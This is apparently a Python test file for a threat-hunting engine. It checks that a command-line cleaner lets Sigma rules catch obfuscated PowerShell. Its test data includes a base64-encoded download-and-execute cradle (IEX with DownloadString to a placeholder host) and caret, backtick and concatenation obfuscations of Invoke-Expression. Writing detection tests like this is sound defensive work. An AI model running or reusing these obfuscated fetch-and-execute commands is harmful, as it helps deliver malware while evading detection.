"""Obfuscated command lines still match public Sigma rules (engine/ingest/clean.py + engine/hunt/sigma.py)."""
import base64

import duckdb

from engine.hunt.sigma import _selection
from engine.ingest.clean import clean


def test_obfuscated_command_lines_still_match_public_rules():
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x')".encode("utf-16-le")).decode()
    cmds = ["powershell Invoke-Expression $a", 'p^o^w"e"rshell I`nv`oke-Ex`pression $a',
            "powershell 'Inv'+'oke-Ex'+'pression' $a", "powershell –enc " + enc, "notepad.exe a.txt"]
    con = duckdb.connect()
    con.execute("CREATE TABLE e (cmdline VARCHAR, cmdline_clean VARCHAR, message VARCHAR, target VARCHAR)")
    con.executemany("INSERT INTO e VALUES (?, ?, NULL, NULL)", [(c, clean(c)) for c in cmds])
    sel = _selection({"CommandLine|contains": ["invoke-expression", "downloadstring"]})
    hits = [c for (c,) in con.execute(f"SELECT cmdline FROM e e WHERE {sel}").fetchall()]
    assert hits == cmds[:4]
    # keyword-list rules (no field) search the cleaned text too
    kw = _selection(["invoke-expression"])
    assert len(con.execute(f"SELECT 1 FROM e e WHERE {kw}").fetchall()) == 3


def test_cleaner_leaves_plain_commands_alone():
    assert clean("whoami /all") is None
    assert clean("ipconfig   /all") == "ipconfig /all"
